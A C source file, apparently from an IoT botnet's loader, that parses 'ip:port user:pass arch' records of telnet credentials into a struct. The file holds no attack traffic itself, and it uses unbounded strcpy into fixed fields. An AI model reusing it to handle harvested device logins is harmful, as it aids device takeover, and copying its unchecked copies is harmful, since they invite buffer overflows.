#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include "headers/includes.h"
#include "headers/telnet_info.h"

struct telnet_info *telnet_info_new(char *user, char *pass, char *arch, ipv4_t addr, port_t port, struct telnet_info *info)
{
    if (user) strcpy(info->user, user);
    if (pass) strcpy(info->pass, pass);
    if (arch) strcpy(info->arch, arch);
    info->addr = addr;
    info->port = port;
    info->has_auth = (user != NULL || pass != NULL);
    info->has_arch = (arch != NULL);
    return info;
}

struct telnet_info *telnet_info_parse(char *str, struct telnet_info *out)
{
    char *conn, *auth, *arch;
    char *addr_str, *port_str, *user = NULL, *pass = NULL;
    ipv4_t addr;
    port_t port;

    conn = strtok(str, " ");
    if (!conn) return NULL;
    auth = strtok(NULL, " ");
    if (!auth) return NULL;
    arch = strtok(NULL, " ");

    addr_str = strtok(conn, ":");
    if (!addr_str) return NULL;
    port_str = strtok(NULL, ":");
    if (!port_str) return NULL;

    if (strlen(auth) == 1 && auth[0] == ':')
    {
        user = "";
        pass = "";
    }
    else
    {
        user = strtok(auth, ":");
        pass = strtok(NULL, ":");
    }

    addr = inet_addr(addr_str);
    port = htons(atoi(port_str));

    return telnet_info_new(user, pass, arch, addr, port, out);
}